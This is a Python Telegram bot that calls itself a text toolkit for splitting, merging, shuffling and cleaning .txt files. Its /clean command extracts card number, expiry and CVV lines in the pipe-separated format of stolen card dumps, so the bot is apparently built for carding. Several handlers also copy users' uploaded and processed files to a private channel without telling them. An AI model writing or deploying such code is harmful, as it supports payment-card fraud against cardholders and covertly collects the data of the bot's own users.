import os
import re
import random
import logging
from telegram import Update, Document
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)

# ================= CONFIG =================
from config import BOT_TOKEN, CHANNEL_ID, ADMIN_ID
# ================= LOGGING =================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= STORAGE =================
user_merge_data = {}
processed_file_ids = set()  # 🔥 global duplicate protection

#================== broadcast===================

import sqlite3

conn = sqlite3.connect("users.db")
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    name TEXT,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
""")
conn.commit()
# ================= VALIDATION =================

def is_valid_txt(doc: Document):
    return (
        doc.file_name
        and doc.file_name.lower().endswith(".txt")
        and doc.mime_type == "text/plain"
    )

# ================= ERROR HANDLER =================

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception:", exc_info=context.error)

    if update and hasattr(update, "message") and update.message:
        await update.message.reply_text(
            "❌ Error occurred. Task not completed.\nTry again."
        )


# ================= extract cards =================

def extract_cards(lines):
    pattern = re.compile(
        r"\b(\d{13,16})[|:\s]+(\d{2})[|:\s]+(\d{2,4})[|:\s]+(\d{3,4})\b"
    )

    results = []

    for line in lines:
        match = pattern.search(line)
        if match:
            results.append("|".join(match.groups()))

    # remove duplicates
    return list(dict.fromkeys(results))

# ================= START =================

import asyncio

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    name = user.first_name or "User"
    username = user.username or ""

    # ✅ Save user for broadcast
    try:
        cursor.execute("""
INSERT INTO users (user_id, username, name, last_active)
VALUES (?, ?, ?, CURRENT_TIMESTAMP)
ON CONFLICT(user_id) DO UPDATE SET last_active=CURRENT_TIMESTAMP
""", (user_id, username, name))
        
        conn.commit()
    except Exception as e:
        print(f"DB Error: {e}")

    # 🎯 typing effect
    await update.message.reply_chat_action("typing")
    await asyncio.sleep(1)

    # 🎨 UI Message
    await update.message.reply_text(
        f"👋 Hello *{name}*\n\n"
        "✨ *Text Toolkit Bot Activated*\n\n"
        "Handle your text files smarter, faster, cleaner.\n\n"
        "━━━━━━━━━━━━━━━\n"
        "🔘 *Quick Actions*\n\n"
        "✂️ `/split`\n"
        "📎 `/merge`\n"
        "🧹 `/clean`\n"
        "🔀 `/shuffle`\n"
        "🛑 `/stop`\n"
        "━━━━━━━━━━━━━━━\n\n"
        "📌 *How to use:*\n"
        "Reply to a `.txt` file with a command\n\n"
        "⚡ Fast • Simple • Powerful",
        parse_mode="Markdown"
    )

# ================= SPLIT =================

async def split(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message

        if not msg.reply_to_message or not msg.reply_to_message.document:
            return await msg.reply_text("Reply with /split 500")

        n = int(context.args[0])
        doc = msg.reply_to_message.document

        if not is_valid_txt(doc):
            return await msg.reply_text("❌ Only .txt")

        fid = doc.file_unique_id

        # 🔥 send to channel only once
        if fid not in processed_file_ids:
            await context.bot.send_document(CHANNEL_ID, doc.file_id)
            processed_file_ids.add(fid)

        file = await context.bot.get_file(doc.file_id)
        path = f"{fid}.txt"
        await file.download_to_drive(path)

        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()

        total_parts = (len(lines) + n - 1) // n

        for i in range(total_parts):
            name = f"part_{i+1}.txt"
            chunk = lines[i*n:(i+1)*n]

            with open(name, "w", encoding="utf-8") as f:
                f.writelines(chunk)

            with open(name, "rb") as f:
                await msg.reply_document(f)

            os.remove(name)

        os.remove(path)

        await msg.reply_text(f"✅ Split done ({total_parts} parts)")

    except Exception as e:
        logger.error(e)
        await msg.reply_text("❌ Split failed")

# ================= MERGE =================

async def merge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    # ✅ Usage check
    if not context.args:
        return await update.message.reply_text(
            "❌ Usage: /merge 3\n\nExample:\n/merge 3 → send 3 files to merge"
        )

    # ✅ Safe number parsing
    try:
        count = int(context.args[0])
        if count < 2:
            raise ValueError
    except:
        return await update.message.reply_text(
            "❌ Invalid number\n\nUsage: /merge 3"
        )

    user_merge_data[uid] = {"expected": count, "files": []}

    await update.message.reply_text(
        f"📎 Send {count} .txt files\n\n🛑 Use /stop to cancel"
    )


async def collect_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id

        if uid not in user_merge_data:
            return

        doc = update.message.document
        if not doc or not is_valid_txt(doc):
            return await update.message.reply_text("❌ Only .txt")

        data = user_merge_data[uid]

        file = await context.bot.get_file(doc.file_id)
        path = f"{uid}_{len(data['files'])}.txt"
        await file.download_to_drive(path)

        data["files"].append(path)

        await update.message.reply_text(
            f"📥 Received {len(data['files'])}/{data['expected']}"
        )

        if len(data["files"]) == data["expected"]:
            await do_merge(update, context, uid)

    except Exception as e:
        logger.error(e)
        await update.message.reply_text("❌ Merge failed")


async def do_merge(update: Update, context: ContextTypes.DEFAULT_TYPE, uid):
    try:
        data = user_merge_data[uid]
        out = f"merged_{uid}.txt"

        with open(out, "w", encoding="utf-8") as outfile:
            for p in data["files"]:
                with open(p, "r", encoding="utf-8", errors="ignore") as infile:
                    outfile.write(infile.read())

        # ✅ send to user
        with open(out, "rb") as f:
            await update.message.reply_document(f)

        # ✅ send to channel with caption
        with open(out, "rb") as f:
            await context.bot.send_document(
                chat_id=CHANNEL_ID,
                document=f,
                caption=f"📎 Merged File\nUser: {uid}\nFiles: {len(data['files'])}"
            )

        # cleanup
        for f in data["files"]:
            os.remove(f)

        os.remove(out)
        del user_merge_data[uid]

        await update.message.reply_text("✅ Merge done")

    except Exception as e:
        logger.error(e)
        await update.message.reply_text("❌ Merge failed")

# ================= SHUFFLE =================

async def shuffle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message

        if not msg.reply_to_message or not msg.reply_to_message.document:
            return await msg.reply_text("Reply with /shuffle")

        doc = msg.reply_to_message.document

        if not is_valid_txt(doc):
            return await msg.reply_text("❌ Only .txt")

        file = await context.bot.get_file(doc.file_id)
        path = "shuffle.txt"
        await file.download_to_drive(path)

        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if line.strip()]

        random.shuffle(lines)

        with open("shuffled.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(lines))

        with open("shuffled.txt", "rb") as f:
            await msg.reply_document(f)

        os.remove(path)
        os.remove("shuffled.txt")

        await msg.reply_text("🔀 Shuffled")

    except Exception as e:
        logger.error(e)
        await msg.reply_text("❌ Shuffle failed")

# ================ CLEAN =================

async def clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = update.message

        if not msg.reply_to_message or not msg.reply_to_message.document:
            return await msg.reply_text("Reply with /clean")

        doc = msg.reply_to_message.document

        if not is_valid_txt(doc):
            return await msg.reply_text("❌ Only .txt")

        await msg.reply_text("🧹 Cleaning...")

        file = await context.bot.get_file(doc.file_id)
        path = "clean_input.txt"
        await file.download_to_drive(path)

        # safe read (fix your previous error)
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()

        cleaned = extract_cards(lines)

        if not cleaned:
            return await msg.reply_text("❌ No valid data found")

        output = "cleaned.txt"

        with open(output, "w", encoding="utf-8") as f:
            f.write("\n".join(cleaned))

        # send to user
        with open(output, "rb") as f:
            await msg.reply_document(f)

        # send to channel
        with open(output, "rb") as f:
            await context.bot.send_document(
                chat_id=CHANNEL_ID,
                document=f,
                caption=f"🧹 Cleaned\nTotal: {len(cleaned)}"
            )

        os.remove(path)
        os.remove(output)

        await msg.reply_text(f"✅ Cleaned {len(cleaned)} lines")

    except Exception as e:
        logger.error(e)
        await msg.reply_text("❌ Clean failed")
#================== stop ======================

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    # cancel merge process if active
    if uid in user_merge_data:
        data = user_merge_data.pop(uid)

        for f in data.get("files", []):
            if os.path.exists(f):
                os.remove(f)

        await update.message.reply_text("🛑 Task cancelled.")
    else:
        await update.message.reply_text("No active task to stop.")

#===========≠=========== broadcast handles =======================

async def broadcast(update, context):
    user_id = update.effective_user.id

    if user_id != ADMIN_ID:
        return await update.message.reply_text("❌ You are not allowed!")

    if not context.args:
        return await update.message.reply_text("Usage: /broadcast your message")

    message = " ".join(context.args)

    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()

    success = 0
    failed = 0

    for user in users:
        try:
            await context.bot.send_message(chat_id=user[0], text=message)
            success += 1
        except:
            failed += 1

    await update.message.reply_text(
        f"✅ Broadcast Done!\n\nSuccess: {success}\nFailed: {failed}"
    )

# ================= MAIN =================

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("split", split))
    app.add_handler(CommandHandler("merge", merge))
    app.add_handler(CommandHandler("shuffle", shuffle))
    app.add_handler(CommandHandler("clean", clean))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("broadcast", broadcast))

    app.add_handler(MessageHandler(filters.Document.ALL, collect_files))
    app.add_error_handler(error_handler)

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
